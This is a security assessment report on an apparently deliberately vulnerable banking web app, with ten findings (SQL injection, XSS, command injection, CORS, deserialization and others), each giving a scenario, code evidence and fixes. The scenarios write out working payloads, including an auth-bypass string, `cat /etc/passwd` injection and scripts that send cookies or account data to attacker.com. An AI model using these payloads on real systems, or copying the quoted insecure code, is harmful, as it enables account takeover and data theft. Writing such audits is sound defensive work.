## Detailed Findings

### 1. SQL Injection
**Risk Level: Critical**

**Description:**  
The application is vulnerable to SQL injection attacks in multiple endpoints, allowing attackers to manipulate database queries.

**Affected Components:**
- Login functionality
- Account retrieval
- Transaction history

**Exploitation Scenario:**  
An attacker can bypass authentication by entering `' OR '1'='1` in the username field and any value in the password field. The resulting SQL query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```
This returns the first user in the database (likely the admin), granting unauthorized access.

**Evidence:**
```javascript
// In server.js:
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Recommendation:**
- Use parameterized queries or prepared statements
- Implement input validation
- Apply the principle of least privilege for database users

---

### 2. Cross-Site Scripting (XSS)
**Risk Level: High**

**Description:**  
Multiple XSS vulnerabilities exist where user input is directly inserted into the DOM without proper sanitization.

**Affected Components:**
- Login message display
- User messages in admin panel
- Complaint descriptions

**Exploitation Scenario:**  
An attacker can craft a malicious URL with a script payload in the message parameter:
```
http://localhost:3000/?message=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```
When a user visits this URL, the script executes in their browser, potentially stealing session cookies or performing actions on behalf of the victim.

**Evidence:**
```javascript
// In main.js:
if (message) {
    // VULNERABILITY: XSS - Direct insertion of URL parameter without sanitization
    loginMessage.innerHTML = message;
}
```

**Recommendation:**
- Use content security policy (CSP)
- Implement proper output encoding
- Use safe DOM manipulation methods (textContent instead of innerHTML)

---

### 3. Command Injection
**Risk Level: Critical**

**Description:**  
The admin panel allows execution of arbitrary system commands without proper validation or sanitization.

**Affected Components:**
- System Check functionality in admin panel

**Exploitation Scenario:**  
An authenticated admin user (or an attacker who has gained admin access) can execute arbitrary commands on the server by entering malicious input in the system command field:
```
ping 127.0.0.1 & cat /etc/passwd
```
This would execute both the ping command and display sensitive system files.

**Evidence:**
```javascript
// In admin/index.html:
async function runSystemCheck(e) {
    e.preventDefault();
    
    const command = document.getElementById('system-command').value;
    
    try {
        const response = await fetch('/api/admin/system-check', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ command })
        });
```

**Recommendation:**
- Avoid direct command execution
- Use a whitelist of allowed commands
- Implement proper input validation and sanitization

---

### 4. Broken Access Control
**Risk Level: Critical**

**Description:**  
The application fails to properly enforce access controls, allowing users to access resources and functionality they should not have permission to access.

**Affected Components:**
- Account information retrieval
- Admin functionality
- Transaction history

**Exploitation Scenario:**  
A regular user can access all accounts in the system by directly calling the API endpoint:
```
GET /api/accounts
```
Instead of the intended endpoint that should filter by user ID:
```
GET /api/accounts?userId=X
```

**Evidence:**
```javascript
// In main.js:
async function loadAllAccounts() {
    try {
        // This should be restricted but isn't (VULNERABILITY)
        const response = await fetch('/api/accounts');
        allAccounts = await response.json();
    } catch (error) {
        console.error('Error loading all accounts:', error);
    }
}
```

**Recommendation:**
- Implement proper authorization checks on all API endpoints
- Use role-based access control
- Validate user permissions server-side for every request

---

### 5. Sensitive Data Exposure
**Risk Level: High**

**Description:**  
The application exposes sensitive data in various ways, including storing passwords in plaintext and exposing full user objects in responses.

**Affected Components:**
- User authentication
- Local storage usage
- Database storage

**Exploitation Scenario:**  
An attacker who gains access to the database can directly read plaintext passwords:
```sql
SELECT username, password FROM users;
```
Additionally, sensitive user data is stored in localStorage, which can be accessed by any JavaScript running on the same domain:
```javascript
const storedUser = localStorage.getItem('currentUser');
```

**Evidence:**
```javascript
// In server.js:
db.run(`INSERT OR IGNORE INTO users (username, password, email, role) VALUES ('admin', 'admin123', 'admin@example.com', 'admin')`);

// In main.js:
localStorage.setItem('currentUser', JSON.stringify(data));
```

**Recommendation:**
- Hash passwords using strong algorithms (bcrypt, Argon2)
- Limit sensitive data in responses
- Use secure storage mechanisms (HttpOnly cookies)

---

### 6. Insecure File Upload
**Risk Level: High**

**Description:**  
The application allows file uploads without proper validation of file types or content, potentially allowing malicious files to be uploaded and executed.

**Affected Components:**
- Complaint file upload functionality

**Exploitation Scenario:**  
An attacker can upload a malicious PHP file as an attachment to a complaint:
```
POST /api/complaints/upload
Content-Type: multipart/form-data

[form data including a file named "exploit.php" containing malicious code]
```
If the server is configured to execute PHP files and the upload directory is web-accessible, the attacker can then execute the file by navigating to its URL.

**Evidence:**
```javascript
// In main.js:
async function submitComplaint(e) {
    e.preventDefault();
    
    const subject = document.getElementById('complaint-subject').value;
    const description = document.getElementById('complaint-description').value;
    const fileInput = document.getElementById('complaint-file');
    
    // VULNERABILITY: No file type validation
    
    const formData = new FormData();
    formData.append('userId', currentUser.id);
    formData.append('subject', subject);
    formData.append('description', description);
    
    if (fileInput.files.length > 0) {
        formData.append('file', fileInput.files[0]);
    }
```

**Recommendation:**
- Implement strict file type validation
- Use content-type verification
- Store uploaded files outside the web root
- Rename files to prevent known extension execution

---

### 7. Weak Authentication
**Risk Level: High**

**Description:**  
The application implements weak authentication mechanisms, including plaintext password storage and lack of multi-factor authentication.

**Affected Components:**
- User login
- Session management

**Exploitation Scenario:**  
An attacker can easily brute force passwords due to lack of rate limiting and account lockout:
```
POST /api/login
Content-Type: application/json

{"username": "admin", "password": "password1"}
{"username": "admin", "password": "password2"}
...
```

**Evidence:**
```javascript
// In server.js:
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  // VULNERABILITY: SQL Injection
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  
  db.get(query, (err, user) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // VULNERABILITY: Sensitive data exposure
    req.session.user = user;
    res.json(user);
  });
});
```

**Recommendation:**
- Implement password hashing
- Add rate limiting and account lockout
- Consider multi-factor authentication
- Use secure session management

---

### 8. Security Misconfiguration
**Risk Level: Medium**

**Description:**  
The application has multiple security misconfigurations, including overly permissive CORS settings and insecure cookie configuration.

**Affected Components:**
- Server configuration
- Session management

**Exploitation Scenario:**  
An attacker can create a malicious site that makes cross-origin requests to the banking application, potentially accessing or modifying user data:
```javascript
// On attacker's website
fetch('http://localhost:3000/api/accounts', {
  credentials: 'include'
}).then(response => response.json())
  .then(data => {
    // Send stolen data to attacker's server
    fetch('https://attacker.com/stolen-data', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
```

**Evidence:**
```javascript
// In server.js:
app.use(cors()); // VULNERABILITY: Misconfigured CORS (allows any origin)

// VULNERABILITY: Weak session configuration
app.use(session({
  secret: 'banking-app-secret', // VULNERABILITY: Hardcoded secret
  resave: true,
  saveUninitialized: true,
  cookie: { secure: false } // VULNERABILITY: Insecure cookies
}));
```

**Recommendation:**
- Configure CORS with specific allowed origins
- Use secure, HttpOnly cookies
- Implement proper Content Security Policy
- Use environment variables for secrets

---

### 9. Insecure Deserialization
**Risk Level: High**

**Description:**  
The application uses potentially vulnerable deserialization methods that could allow code execution.

**Affected Components:**
- Data import functionality

**Exploitation Scenario:**  
An attacker could craft a malicious serialized object that, when deserialized by the application, executes arbitrary code:
```javascript
// Crafting a malicious payload that exploits serialize-javascript vulnerabilities
const maliciousPayload = '{"__proto__":{"toString":"function(){return eval(\\\"fetch(\\\\\\\"https://attacker.com/\\\\\\\"+document.cookie)\\\")}"}}'
```

**Evidence:**
```javascript
// In package.json:
"dependencies": {
  // ...
  "serialize-javascript": "^3.1.0",
  // ...
}
```

**Recommendation:**
- Update to the latest version of all dependencies
- Use safer alternatives for serialization/deserialization
- Implement input validation before deserialization

---

### 10. Insufficient Logging & Monitoring
**Risk Level: Medium**

**Description:**  
The application lacks comprehensive logging and monitoring, making it difficult to detect and respond to security incidents.

**Affected Components:**
- Server-side logging
- Error handling

**Exploitation Scenario:**  
An attacker performs multiple failed login attempts followed by a successful SQL injection attack. Due to insufficient logging, the attack goes unnoticed:
```
POST /api/login
Content-Type: application/json

{"username": "' OR '1'='1", "password": "anything"}
```

**Evidence:**
```javascript
// In server.js:
// VULNERABILITY: Insufficient logging
app.use(morgan('dev'));
```

**Recommendation:**
- Implement comprehensive logging for security-relevant events
- Set up monitoring and alerting
- Establish incident response procedures
- Log authentication attempts, access control failures, and input validation failures
